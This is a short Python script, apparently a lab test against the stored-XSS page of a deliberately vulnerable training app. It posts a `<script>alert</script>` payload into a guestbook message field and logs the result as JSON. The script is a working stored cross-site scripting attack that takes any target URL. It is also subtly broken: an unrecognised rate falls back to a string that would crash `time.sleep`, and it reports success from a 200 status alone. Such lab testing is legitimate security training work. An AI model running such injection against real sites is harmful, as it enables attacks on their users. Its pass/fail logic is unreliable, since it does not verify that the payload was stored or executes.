import requests
from datetime import datetime
from pathlib import Path
import sys
import json
import time
import os

# Setup initial configuration
logs_dir = Path('logs')
logs_dir.mkdir(exist_ok=True)
session = requests.Session()

if len(sys.argv) > 2:
    base_url = sys.argv[1]
    request_rate = sys.argv[2]
else:
    print("Base URL or request rate was not provided.")
    sys.exit(1)

# Map request rate to a specific time interval
delays = {'low': 7, 'medium': 2, 'high': 0.5}
delay = delays.get(request_rate, 'medium')  # Default to 'medium' if rate is unrecognized

xss_s_url = f"{base_url}/vulnerabilities/xss_s/"

def exploit_stored_xss():
    total_tests = 0
    tests_passed = 0
    tests_failed = 0
    details = []

    # Malicious payload
    payload = '<script>alert("XSS");</script>'
    data = {
        'Message': payload,
        'Name': 'Mitnick', 
    }

    # Send the malicious comment
    response = session.post(xss_s_url, data=data)
    total_tests += 1

    # Check whether the submission was successful based on the HTTP status
    if response.status_code == 200:
        tests_passed += 1
        result = "PASSED"
        print("Payload submitted successfully and might be executed when viewed.")
    else:
        tests_failed += 1
        result = "FAILED"
        print("Failed to submit the payload.")

    details.append({
        "payload": payload,
        "status_code": response.status_code,
        "result": result
    })
    
    
    time.sleep(delay)
    
    
    # Log results
    script_name = os.path.splitext(os.path.basename(__file__))[0]
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_name = f"results_{script_name}_{timestamp}.json"
    results_file = logs_dir / file_name
    result_summary = {
        'date_time': timestamp,
        'base_url': base_url,
        'total_tests': total_tests,
        'tests_passed': tests_passed,
        'tests_failed': tests_failed,
        'tested_url': xss_s_url,
        'details': details
    }
    with open(results_file, 'w') as f:
        json.dump(result_summary, f, indent=4)
    print(f"Results saved to {results_file}")

if __name__ == "__main__":
    exploit_stored_xss()